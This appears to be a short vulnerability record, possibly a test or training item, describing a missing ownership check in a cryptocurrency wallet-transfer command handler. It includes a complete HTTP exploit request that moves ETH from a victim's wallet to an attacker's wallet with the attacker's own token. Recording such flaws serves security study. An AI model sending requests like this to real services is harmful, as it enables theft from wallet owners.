diagnosis: The CQRS command handler accepts sourceWalletId from the request body and appends a WalletFundsTransferred event to EventStoreDB stream wallet-${sourceWalletId}. It never validates that the authenticated caller (req.user.id) is the owner of sourceWalletId, allowing an attacker to drain funds from arbitrary cryptocurrency wallets.
exploit_request:
POST /api/commands/wallet-transfer HTTP/1.1
Host: cqrs.cryptowallet.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"sourceWalletId": "wal_victim_eth_88190", "destinationWalletId": "wal_attacker_eth_0042", "amount": 50.0, "currency": "ETH"}
